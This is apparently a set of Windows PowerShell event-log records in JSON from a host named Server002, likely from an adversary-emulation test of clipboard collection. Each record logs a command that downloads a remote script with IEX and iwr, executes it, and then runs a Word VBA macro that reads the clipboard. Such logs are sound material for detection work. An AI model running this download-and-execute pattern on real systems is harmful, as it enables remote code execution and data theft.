{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 21:20:56.0840465"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9c22f043-c260-4769-a2ce-8b49868547c7\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nSet-Clipboard -value \"file data Test, grab data from clipboard via VBA\"\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 21:20:56.0980409"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9c22f043-c260-4769-a2ce-8b49868547c7\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nSet-Clipboard -value \"file data Test, grab data from clipboard via VBA\"\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 21:20:56.0980409"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9c22f043-c260-4769-a2ce-8b49868547c7\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nSet-Clipboard -value \"file data Test, grab data from clipboard via VBA\"\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 21:20:56.1125381"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9c22f043-c260-4769-a2ce-8b49868547c7\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nSet-Clipboard -value \"file data Test, grab data from clipboard via VBA\"\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 21:20:56.1125381"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9c22f043-c260-4769-a2ce-8b49868547c7\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nSet-Clipboard -value \"file data Test, grab data from clipboard via VBA\"\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 21:20:56.1125381"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9c22f043-c260-4769-a2ce-8b49868547c7\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nSet-Clipboard -value \"file data Test, grab data from clipboard via VBA\"\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 21:20:56.3383570"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9c22f043-c260-4769-a2ce-8b49868547c7\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nSet-Clipboard -value \"file data Test, grab data from clipboard via VBA\"\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=a80a5972-1524-4a45-91fd-1be472d68915\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 21:20:58.4186202"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=16\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9c22f043-c260-4769-a2ce-8b49868547c7\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nSet-Clipboard -value \"file data Test, grab data from clipboard via VBA\"\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=a80a5972-1524-4a45-91fd-1be472d68915\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
